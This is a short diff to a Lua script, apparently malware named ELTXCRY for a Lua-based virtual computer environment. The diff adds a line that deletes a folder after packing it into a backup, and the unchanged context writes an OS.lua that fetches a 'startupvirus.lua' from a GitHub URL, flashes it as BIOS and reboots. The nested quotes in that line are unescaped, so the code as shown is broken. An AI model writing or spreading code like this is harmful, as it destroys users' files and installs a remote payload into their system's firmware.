@@ -28,7 +28,7 @@ filesystem.copy("Localizations", "/eltxcry")
 compressor.pack("/data-backup.pkg", {
 	"/eltxcry"
 })
-
+filesystem.remove("/eltxcry")
 -- Write ALL files
 
 filesystem.write("OS.lua", "shell.execute("wget -f https://raw.githubusercontent.com/EletrixtimeYT/ELTXCRY/main/startupvirus.lua /tmp/bios.lua && flash -q /tmp/bios.lua && reboot")")
